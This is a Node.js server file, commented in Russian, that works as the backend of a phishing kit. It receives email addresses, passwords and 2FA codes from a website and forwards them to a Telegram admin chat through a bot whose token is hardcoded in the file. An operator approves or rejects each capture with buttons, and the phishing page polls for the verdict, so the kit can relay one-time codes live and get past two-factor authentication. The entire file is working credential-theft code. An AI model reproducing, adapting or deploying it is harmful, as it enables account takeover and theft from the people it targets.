const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const cors = require('cors');

// --- НАСТРОЙКИ ---
const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ'; 
const adminChatId = '-1003894478662'; 
// -----------------

const bot = new TelegramBot(token, { polling: true });
const app = express();

app.use(cors()); // Позволяет сайту с GitHub делать запросы к Render
app.use(express.json());

let userStatuses = {}; 

// Обработка ошибок polling (чтобы сервер не падал)
bot.on('polling_error', (error) => console.log('Ошибка бота:', error.code));

// 1. Прием данных с сайта
app.post('/send-data', (req, res) => {
    const { type, email, pass, code, userId } = req.body;
    
    userStatuses[userId] = 'pending';
    console.log(`[${userId}] Новый запрос: ${type}`);

    let message = '';
    if (type === 'auth') {
        message = `⚠️ **Вход**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``;
    } else if (type === '2fa') {
        message = `🔢 **Код 2FA**: \`${code}\``;
    }

    bot.sendMessage(adminChatId, message, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: '✅ Подтвердить', callback_data: `ok_${userId}` },
                { text: '❌ Неверно', callback_data: `err_${userId}` }
            ]]
        }
    });

    res.json({ status: 'ok' });
});

// 2. Обработка кнопок
bot.on('callback_query', (query) => {
    const [action, userId] = query.data.split('_');

    userStatuses[userId] = (action === 'ok') ? 'success' : 'error';

    bot.answerCallbackQuery(query.id, { text: "Статус обновлен" });
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id
    });
});

// 3. Проверка статуса сайтом
app.get('/check/:userId', (req, res) => {
    res.json({ status: userStatuses[req.params.userId] || 'none' });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🚀 Сервер на порту ${PORT}`));
